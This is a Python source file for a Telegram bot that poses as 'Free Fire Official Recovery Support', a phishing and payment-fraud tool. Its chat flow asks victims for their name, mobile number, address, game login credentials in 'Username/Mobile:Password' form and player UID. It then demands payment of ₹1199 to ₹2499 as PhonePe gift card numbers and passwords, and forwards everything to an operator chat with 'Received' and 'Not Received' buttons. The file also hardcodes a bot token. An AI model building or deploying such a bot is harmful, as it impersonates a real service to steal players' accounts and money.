import os
import random
import string
import time
from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

TOKEN = "9015143190:AAGaL2nkNpxlK6_1zutMDQdSU4YR6TNp1hk"
bot = telebot.TeleBot(TOKEN, threaded=False)

app = Flask(__name__)

# Temporary storage for user states & session timestamps (Timeout control)
user_states = {}
SESSION_TIMEOUT = 900  # 15 minutes in seconds

def generate_ticket_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))

def check_session_timeout(chat_id):
    if chat_id in user_states:
        last_active = user_states[chat_id].get("timestamp", 0)
        if time.time() - last_active > SESSION_TIMEOUT:
            del user_states[chat_id]
            return True
    return False

# Webhook route for Telegram Bot messages
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_data = request.json
        if json_data:
            update = telebot.types.Update.de_json(json_data)
            bot.process_new_updates([update])
        return '', 200
    else:
        return 'Forbidden', 403

# Basic home route
@app.route('/')
def index():
    return "FF Recovery Bot is live and running 24/7 with Advanced Protection!"

# 1. /start command -> Welcome Banner + T&C + Agree Button
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_states[chat_id] = {"timestamp": time.time()}
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Agree & Continue", callback_data="agree_tc"))
    
    banner_url = "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800" # Sample banner image
    caption = (
        "🛡️ **Welcome to Free Fire Official Recovery Support** 🛡️\n\n"
        "Please read and agree to our **Terms & Conditions** before proceeding with your account recovery.\n\n"
        "• All submissions are securely processed.\n"
        "• Accurate details ensure faster processing."
    )
    
    try:
        bot.send_photo(chat_id, banner_url, caption=caption, parse_mode="Markdown", reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)

# 2. T&C Agree -> Service Needed Selection (Basic vs Premium)
@bot.callback_query_handler(func=lambda call: call.data == "agree_tc")
def agree_tc_callback(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("🟢 Basic Recovery", callback_data="plan_basic"),
        InlineKeyboardButton("⭐ Premium Recovery", callback_data="plan_premium")
    )
    
    bot.edit_message_caption(
        chat_id=chat_id,
        message_id=call.message.message_id,
        caption="🛠️ **What kind of service needed?**\n\nSelect your preferred recovery tier below:",
        parse_mode="Markdown",
        reply_markup=markup
    )

# 3. Plan Selection & Duration Confirmation
@bot.callback_query_handler(func=lambda call: call.data in ["plan_basic", "plan_premium"])
def plan_selection_callback(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    is_premium = (call.data == "plan_premium")
    plan_name = "Premium Recovery" if is_premium else "Basic Recovery"
    duration = "24-48 Hours" if is_premium else "10-15 Days"
    
    user_states[chat_id] = {"plan": plan_name, "is_premium": is_premium, "timestamp": time.time()}
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Confirm & Proceed", callback_data=f"confirm_plan_{'premium' if is_premium else 'basic'}"))
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"📋 **Selected Plan:** {plan_name}\n⏳ **Estimated Time:** `{duration}`\n\nClick confirm to view specific service sub-options.",
        parse_mode="Markdown",
        reply_markup=markup
    )

# 4. Sub-Options & Pricing Display (Mail Unlink vs Unlink+Relink)
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_plan_"))
def show_sub_options(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    is_premium = "premium" in call.data
    
    # Pricing logic
    p1_price = "₹1799" if is_premium else "₹1199"
    p2_price = "₹2499" if is_premium else "₹1799"
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton(f"✉️ Mail Unlink ({p1_price})", callback_data=f"sub_mail_{'prem' if is_premium else 'basic'}"),
        InlineKeyboardButton(f"🔗 Unlink + Relink ({p2_price})", callback_data=f"sub_relink_{'prem' if is_premium else 'basic'}")
    )
    
    plan_text = "⭐ **Premium Plan Options**" if is_premium else "🟢 **Basic Plan Options**"
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"{plan_text}\n\nSelect the exact recovery sub-option you require:",
        parse_mode="Markdown",
        reply_markup=markup
    )

# 5. Handle Sub-Option selection & start Data Collection Flow
@bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
def handle_sub_selection(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    parts = call.data.split("_")
    sub_type = parts[1] # mail or relink
    tier = parts[2]     # prem or basic
    
    service_name = "Mail Unlink" if sub_type == "mail" else "Unlink + Relink"
    
    # Determine price
    if tier == "prem":
        price = "1799" if sub_type == "mail" else "2499"
    else:
        price = "1199" if sub_type == "mail" else "1799"
        
    user_states[chat_id].update({
        "sub_option": service_name,
        "price": price,
        "step": "get_name",
        "timestamp": time.time()
    })
    
    bot.send_message(
        chat_id,
        f"🎯 **Selected:** {service_name} (`₹{price}`)\n\nKripya apna poora **Name** enter karein:",
        parse_mode="Markdown"
    )

# 6. Step-by-Step Chat Data Collection (Web App simulation / chat flow)
@bot.message_handler(func=lambda message: message.chat.id in user_states and "step" in user_states[message.chat.id])
def collect_user_details(message):
    chat_id = message.chat.id
    
    if check_session_timeout(chat_id):
        bot.send_message(chat_id, "⌛ Aapka session timeout ho gaya hai. Kripya `/start` dabakar dobara shuru karein.", parse_mode="Markdown")
        return
        
    user_states[chat_id]["timestamp"] = time.time()
    state = user_states[chat_id]["step"]
    text = message.text.strip()

    if state == "get_name":
        user_states[chat_id]["name"] = text
        user_states[chat_id]["step"] = "get_mobile"
        bot.send_message(chat_id, "📱 Apne account ka **Mobile Number** enter karein:")

    elif state == "get_mobile":
        user_states[chat_id]["mobile"] = text
        user_states[chat_id]["step"] = "get_address"
        bot.send_message(chat_id, "🏠 Apna current **Address (City / State)** enter karein:")

    elif state == "get_address":
        user_states[chat_id]["address"] = text
        user_states[chat_id]["step"] = "get_login_method"
        
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("Google", callback_data="login_Google"),
            InlineKeyboardButton("Facebook", callback_data="login_Facebook"),
            InlineKeyboardButton("VK / Apple", callback_data="login_Other")
        )
        bot.send_message(chat_id, "🔐 Account ka **Login Method** select karein:", reply_markup=markup)

# Login method selection callback
@bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
def handle_login_method(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    login_method = call.data.split("_")[1]
    if chat_id in user_states:
        user_states[chat_id]["login_method"] = login_method
        user_states[chat_id]["step"] = "get_credentials"
        
        bot.send_message(
            chat_id,
            "🔑 Ab apne login credentials bhejein:\nFormat: `Username/Mobile:Password` ek hi message mein enter karein.",
            parse_mode="Markdown"
        )

# Credentials & UID collection handler
@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_credentials")
def handle_credentials(message):
    chat_id = message.chat.id
    user_states[chat_id]["credentials"] = message.text.strip()
    user_states[chat_id]["step"] = "get_uid"
    bot.send_message(chat_id, "🆔 Apna Free Fire **UID (Player ID)** enter karein:")

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_uid")
def handle_uid(message):
    chat_id = message.chat.id
    user_states[chat_id]["uid"] = message.text.strip()
    user_states[chat_id]["step"] = "summary_review"
    
    data = user_states[chat_id]
    
    # 7. Summary Screen & Correctness Confirmation
    summary_text = (
        "📋 **Review Your Details:**\n\n"
        f"👤 **Name:** {data.get('name')}\n"
        f"📱 **Mobile:** {data.get('mobile')}\n"
        f"🏠 **Address:** {data.get('address')}\n"
        f"🔐 **Login Method:** {data.get('login_method')}\n"
        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
        f"🆔 **UID:** `{data.get('uid')}`\n"
        f"🛠️ **Service:** {data.get('sub_option')}\n"
        f"💰 **Amount:** ₹{data.get('price')}\n\n"
        "⚠️ *All details given above is correct.*"
    )
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Details Correct - Proceed to Payment", callback_data="proceed_payment"))
    
    bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)

# 8. Payment Screen (PhonePe Gift Card with Anti-Fraud Validation)
@bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
def proceed_to_payment(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    price = user_states.get(chat_id, {}).get("price", "0")
    user_states[chat_id]["step"] = "get_gift_card"
    
    payment_prompt = (
        f"💳 **PHONEPE GIFT CARD PAYMENT** 💳\n\n"
        f"Total Amount Payable: **₹{price}**\n\n"
        "Kripya PhonePe Gift Card ke zariye payment karein aur niche diye gaye format mein details bhejein:\n\n"
        "Format: `GiftCardNumber:Password`\n"
        "*(Example: `9876543210123456:abcd1234`)*"
    )
    bot.send_message(chat_id, payment_prompt, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_gift_card")
def handle_gift_card(message):
    chat_id = message.chat.id
    gift_card_input = message.text.strip()
    
    # Point 1: Anti-Fraud Format Validation
    if ":" not in gift_card_input or len(gift_card_input) < 10:
        bot.send_message(
            chat_id, 
            "❌ **Invalid Format!** Kripya sahi format mein enter karein:\n`GiftCardNumber:Password`", 
            parse_mode="Markdown"
        )
        return

    gc_parts = gift_card_input.split(":", 1)
    gc_number = gc_parts[0].strip()
    gc_pass = gc_parts[1].strip()

    # Basic length check for anti-fraud
    if not gc_number.isdigit() or len(gc_number) < 12:
        bot.send_message(chat_id, "❌ **Verification Failed:** Gift Card number अमान्य (invalid) lag raha hai. Kripya sahi number daalein.", parse_mode="Markdown")
        return

    user_states[chat_id]["gift_card_no"] = gc_number
    user_states[chat_id]["gift_card_pass"] = gc_pass
    
    ticket_id = f"FF-{generate_ticket_id()}"
    user_states[chat_id]["ticket_id"] = ticket_id
    
    data = user_states[chat_id]
    username = message.from_user.username or message.from_user.first_name
    
    # Send confirmation to User
    bot.send_message(
        chat_id,
        "⏳ **Details is under verification please wait till confirmation.**",
        parse_mode="Markdown"
    )
    
    # 9. Admin Split Notifications (2 Messages)
    admin_chat_id = chat_id # Note: Replace with actual Admin Telegram Chat ID if needed
    
    msg_basic_details = (
        f"🚨 **New Recovery Request (Basic Info)**\n\n"
        f"🎟️ **Ticket:** `{ticket_id}`\n"
        f"👤 **User:** @{username} (`{chat_id}`)\n"
        f"📛 **Name:** {data.get('name')}\n"
        f"📱 **Mobile:** {data.get('mobile')}\n"
        f"🏠 **Address:** {data.get('address')}\n"
        f"🔐 **Login Method:** {data.get('login_method')}\n"
        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
        f"🆔 **UID:** `{data.get('uid')}`"
    )
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Received", callback_data=f"pay_recv_{ticket_id}_{chat_id}"),
        InlineKeyboardButton("❌ Not Received", callback_data=f"pay_notrecv_{ticket_id}_{chat_id}")
    )
    
    msg_payment_details = (
        f"💳 **New Payment Verification (Gift Card)**\n\n"
        f"🎟️ **Ticket:** `{ticket_id}`\n"
        f"💰 **Amount:** ₹{data.get('price')}\n"
        f"🎁 **Gift Card No:** `{gc_number}`\n"
        f"🔒 **Password:** `{gc_pass}`"
    )
    
    bot.send_message(chat_id, msg_basic_details, parse_mode="Markdown")
    bot.send_message(chat_id, msg_payment_details, parse_mode="Markdown", reply_markup=markup)
    
    # Clear active state after submission
    if chat_id in user_states:
        del user_states[chat_id]

# 10. Admin Action (Received / Not Received) Handler
@bot.callback_query_handler(func=lambda call: call.data.startswith(("pay_recv_", "pay_notrecv_")))
def handle_admin_payment_action(call):
    data_parts = call.data.split("_")
    action = data_parts[1] # recv or notrecv
    ticket_id = data_parts[2]
    target_chat_id = data_parts[3]

    bot.answer_callback_query(call.id)

    if action == "recv":
        bot.send_message(
            target_chat_id, 
            "✅ Your payment is successfully received. Your mail Unlink as soon as possible when your mail is Unlink we will inform you . Have a Good Day.", 
            parse_mode="Markdown"
        )
        bot.edit_message_text(f"✅ Payment Received & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    else:
        # Point 3: Admin 'Not Received' Action message to user
        bot.send_message(
            target_chat_id, 
            "❌ Aapka PhonePe Gift Card verification fail ho gaya hai ya payment match nahi hui hai. Kripya apne gift card details check karke dobara `/start` se submit karein.", 
            parse_mode="Markdown"
        )
        bot.edit_message_text(f"❌ Payment Not Received / Rejected (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
